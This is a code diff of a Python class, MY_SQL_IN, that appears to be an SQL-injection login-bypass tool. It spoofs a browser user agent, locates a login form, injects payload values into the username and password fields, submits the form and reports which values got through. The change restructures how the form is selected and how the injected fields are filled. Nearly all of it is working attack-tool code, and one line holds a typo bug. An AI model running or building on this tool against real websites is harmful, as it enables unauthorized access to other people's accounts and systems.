@@ -42,93 +42,99 @@ class MY_SQL_IN:
                  request.set_handle_refresh(True, max_time=1)
                  request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                  Get_Oregnal_URL = request.open(url).read()   
-                 try:             
-                    request.select_form(nr = 0)
-                 except Exception :
-                      try:
-                         request.select_form(nr = 1) 
-                      except Exception :   
-                           try:
-                              request.select_form(nr = 2)
-                           except Exception : 
-                                try:
-                                  request.select_form(nr = 3)
-                                except Exception :   
-                                    try:
-                                      request.select_form(nr = 4)
-                                    except Exception :    
-                                        print("[!] NO Form HTML Login Found  ")
-                                        exit()
-                 if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
-                 and not self.args.UserInput and not self.args.PassInput:
+                 
+                 def Command_Exe() :                      
+                     if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
+                     and not self.args.UserInput and not self.args.PassInput:
                        request["username"] = f'{command}'
                        request["password"] = 'password'  
-                 elif self.args.UserForm and not self.args.user and not self.args.PassForm and not self.args.password\
-                 and not self.args.UserInput and not self.args.PassInput:                   
+                     elif self.args.UserForm and not self.args.user and not self.args.PassForm and not self.args.password\
+                     and not self.args.UserInput and not self.args.PassInput:                   
                        request[f'{self.args.UserForm}'] = f'{command}'
                        request["password"] = 'password'
-                 elif not self.args.UserForm and not self.args.user and  self.args.PassForm and  self.args.password\
-                 and not self.args.UserInput and not self.args.PassInput : 
+                     elif not self.args.UserForm and not self.args.user and  self.args.PassForm and  self.args.password\
+                     and not self.args.UserInput and not self.args.PassInput : 
                        request['username']=f'{command}'
                        request[f'{self.args.PassForm}']=f'{self.args.password}'   
-                 elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
-                 and self.args.UserInput and not self.args.PassInput :                           
+                     elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
+                     and self.args.UserInput and not self.args.PassInput :                           
                        request['username']=f'{command}'
                        request[f'{self.args.PassForm}']='password'    
-                 elif self.args.UserForm and self.args.PassForm and not self.args.user and not self.args.password\
-                 and self.args.UserInput and not self.args.PassInput:   
+                     elif self.args.UserForm and self.args.PassForm and not self.args.user and not self.args.password\
+                     and self.args.UserInput and not self.args.PassInput:   
                        request[f'{self.args.UserForm}'] = f'{command}'  
                        request[f'{self.args.PassForm}'] = 'password'                 
-                 elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
-                 and not self.args.UserInput and not self.args.PassInput:
+                     elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
+                     and not self.args.UserInput and not self.args.PassInput:
                        request[f'{self.args.UserForm}']=f'{command}'
                        request[f'{self.args.PassForm}']=f'{self.args.password}'   
-                 elif self.args.UserForm and not  self.args.user and not self.args.PassForm and not self.args.password\
-                 and not self.args.UserInput and not self.args.PassInput:                   
+                     elif self.args.UserForm and not  self.args.user and not self.args.PassForm and not self.args.password\
+                     and not self.args.UserInput and not self.args.PassInput:                   
                        request[f'{self.args.UserForm}'] = 'User'
                        request["password"] =  f'{command}' 
-                 elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
-                 and not self.args.UserInput and self.args.PassInput :                           
+                     elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
+                     and not self.args.UserInput and self.args.PassInput :                           
                        request['username']='User'
                        request[f'{self.args.PassForm}']=f'{command}'   
-                 elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
-                 and not self.args.UserInput and not self.args.PassInput : 
+                     elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
+                     and not self.args.UserInput and not self.args.PassInput : 
                        request[f'{self.args.UserForm}'] =  f'{self.args.user}'
                        request[f'{self.args.PassForm}']=f'{command}'                       
-                 elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
-                 and not self.args.UserInput and  self.args.PassInput :   
+                     elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
+                     and not self.args.UserInput and  self.args.PassInput :   
                        request[f'{self.args.UserForm}'] =  f'{self.args.user}' 
                        request[f'{self.args.PassForm}'] = f'{command}'                 
-                 elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  self.args.user\
-                 and not self.args.UserInput and self.args.PassInput :
+                     elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  self.args.user\
+                     and not self.args.UserInput and self.args.PassInput :
                        request[f'{self.args.UserForm}']=f'{self.args,user}'
                        request[f'{self.args.PassForm}']=f'{command}'    
-                 elif not self.args.UserForm and not self.args.PassForm and not self.args.password  and not self.args.user\
-                 and self.args.UserInput and self.args.PassInput :
+                     elif not self.args.UserForm and not self.args.PassForm and not self.args.password  and not self.args.user\
+                     and self.args.UserInput and self.args.PassInput :
                        request['username']=f'{command}'
                        request['password']=f'{command}'         
-                 elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
-                 and self.args.UserInput and self.args.PassInput :
+                     elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
+                     and self.args.UserInput and self.args.PassInput :
                        request[f'{self.args.UserForm}']=f'{command}'
                        request[f'{self.args.PassForm}']=f'{command}'         
-                 elif self.args.UserForm and  not self.args.PassForm and not self.args.password  and  not self.args.user\
-                 and self.args.UserInput and self.args.PassInput:
+                     elif self.args.UserForm and  not self.args.PassForm and not self.args.password  and  not self.args.user\
+                     and self.args.UserInput and self.args.PassInput:
                        request[f'{self.args.UserForm}']=f'{command}'
                        request['password']=f'{command}'       
-                 elif not self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
-                 and self.args.UserInput and self.args.PassInput:
+                     elif not self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
+                     and self.args.UserInput and self.args.PassInput:
                        request['username']=f'{command}'
                        request[f'{self.args.PassForm}']=f'{command}'  
-                 elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
-                 and self.args.UserInput and self.args.PassInput:
+                     elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
+                     and self.args.UserInput and self.args.PassInput:
                        request['username']=f'{self.args.user}'
                        request[f'{self.args.PassForm}']=f'{self.args.password}'    
               
-                 else:
-                     print('[!] Command Not Found')
-                     print('[!] Plases see the help options to how to use ')
-                     exit()       
-                                       
+                     else:
+                       print('[!] Command Not Found')
+                       print('[!] Plases see the help options to how to use ')
+                       exit()       
+                 try:             
+                    request.select_form(nr = 0)
+                    Command_Exe()
+                 except Exception :
+                      try:
+                         request.select_form(nr = 1) 
+                         Command_Exe()
+                      except Exception :   
+                           try:
+                              request.select_form(nr = 2)
+                              Command_Exe()
+                           except Exception : 
+                                try:
+                                  request.select_form(nr = 3)
+                                  Command_Exe()
+                                except Exception :   
+                                    try:
+                                      request.select_form(nr = 4)
+                                      Command_Exe()
+                                    except Exception :    
+                                        print("[!] NO Form HTML Login Found  ")
+                                        exit()                     
                  response   = request.submit()
                  content    = response.read()
                  passlogin  = response.geturl() 
@@ -154,7 +160,7 @@ class MY_SQL_IN:
                       if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                       and not self.args.UserInput and not self.args.PassInput:
                           print(B+'[+] '+R+'username : '+Y+f'{command}')
-                          print(B+'[+] '+R+'Password : password')
+                          print(B+'[+] '+R+'Password : '+Y+ 'password')
                       elif self.args.UserForm and not self.args.user and not self.args.PassForm and not self.args.password\
                       and not self.args.UserInput and not self.args.PassInput: 
                            print(B+'[+] '+R+' username['+P+'{:<6}'.format(self.args.UserForm) +R+"] : "+Y+f'{ command}')
@@ -223,7 +229,7 @@ class MY_SQL_IN:
                  print(B+"[*] "+R+"Bad URL Connection refused"+W)
                  exit()
          except Exception as a :
-                print( B+"[#] "+R+"Error : "+Y,a+W )
+                print( B+"[#] "+R+"Error : "+Y+str(a)+W )
          except KeyboardInterrupt:
               exit()
        
